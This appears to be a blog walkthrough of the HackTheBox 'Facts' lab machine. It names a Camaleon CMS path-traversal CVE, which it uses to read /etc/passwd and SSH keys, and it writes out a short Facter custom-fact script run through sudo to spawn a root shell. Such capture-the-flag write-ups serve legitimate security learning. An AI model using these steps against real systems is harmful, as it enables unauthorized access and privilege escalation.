+++
date = '2026-04-16T14:01:07+07:00'
title = 'HackTheBox Facts Machine Walkthrough'
tags = ['HackTheBox']
description = 'Detailed HTB Facts writeup. Follow this complete walkthrough to capture the user and root flags using practical penetration testing techniques.'
draft = false
htb_active = true

[cover]
  image = '/images/posts/hackthebox-facts-cover.png'
  alt = 'HackTheBox Facts Cover'
  caption = 'HackTheBox Facts Cover'
  relative = false
+++

## Reconnaissance & Enumeration

Running simple `nmap` command:

```bash
nmap -v -sV <MACHINE_IP>
```

![Guide image](/images/posts/hackthebox-facts-1.png)

Two simple `http` and `ssh` services. Access to the website `http://facts.htb`. After an amount of time of enumeration, I found an `/admin/login` where I check the source and found the technology behind the app: **Camaleon CMS**. Found a CVE that we can leverage of it:

**CVE-2024-46987:** a Path Traversal bug in Camaleon CMS 2.8.0 < 2.8.2 (work on 2.9.0). It allows authenticated users to read sensitive server files via the MediaController. Intended for authorized security auditing and educational research only. [github.com/Goultarde/CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987)

## User Flag

1. Create an account and take that credentials for the exploit script that we can read files of the website (`/etc/passwd`):

![Guide image](/images/posts/hackthebox-facts-2.png)

2. Found `william` user, read the flag in `william` directory:

![Guide image](/images/posts/hackthebox-facts-3.png)

## Root Flag

1. In order to escelate priviledges, we first have to `ssh` to get an interactive shell, I tried search for **SSH Key** of users `trivia` and `william`:

![Guide image](/images/posts/hackthebox-facts-4.png)

2. Get the passphrase of the **SSH Key**:

![Guide image](/images/posts/hackthebox-facts-5.png)

3. Escelate priviledges:

```bash
trivia@facts:~$ sudo -l # Found /usr/bin/facter can be run as root without password
```

![Guide image](/images/posts/hackthebox-facts-6.png)

```bash
trivia@facts:~$ mkdir -p /tmp/privesc
trivia@facts:~$ cat << 'EOF' > /tmp/privesc/pwn.rb
Facter.add(:pwn) do
  setcode do
	system("/bin/bash")
  end
end
EOF

trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/privesc
```

![Guide image](/images/posts/hackthebox-facts-7.png)

![Guide image](/images/posts/hackthebox-facts-8.png)

Achievement: [Link to Achievement](https://labs.hackthebox.com/achievement/machine/2924947/829)
